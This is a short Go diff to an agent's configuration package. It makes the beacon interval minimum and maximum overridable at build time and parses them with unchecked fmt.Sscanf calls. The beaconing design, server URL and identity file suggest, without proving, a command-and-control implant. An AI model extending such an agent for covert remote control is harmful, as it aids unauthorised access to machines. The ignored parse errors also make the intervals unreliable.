@@ -1,6 +1,7 @@
 package config
 
 import (
+	"fmt"
 	"os"
 )
 
@@ -20,6 +21,12 @@ type Config struct {
 	IsDebug       bool
 }
 
+// DefaultBeaconMin can be overridden at build time
+var DefaultBeaconMin = "10"
+
+// DefaultBeaconMax can be overridden at build time
+var DefaultBeaconMax = "30"
+
 // Load returns the agent configuration from environment or defaults
 func Load() *Config {
 	serverURL := os.Getenv("BYTECODE_SERVER")
@@ -32,10 +39,15 @@ func Load() *Config {
 		identityFile = ".bytecode_id"
 	}
 
+	// Simple conversion from string to int for build-time flags
+	var min, max int
+	fmt.Sscanf(DefaultBeaconMin, "%d", &min)
+	fmt.Sscanf(DefaultBeaconMax, "%d", &max)
+
 	return &Config{
 		ServerURL:    serverURL,
-		BeaconMin:    10,
-		BeaconMax:    30,
+		BeaconMin:    min,
+		BeaconMax:    max,
 		IdentityFile: identityFile,
 		IsDebug:      DebugMode == "true",
 	}
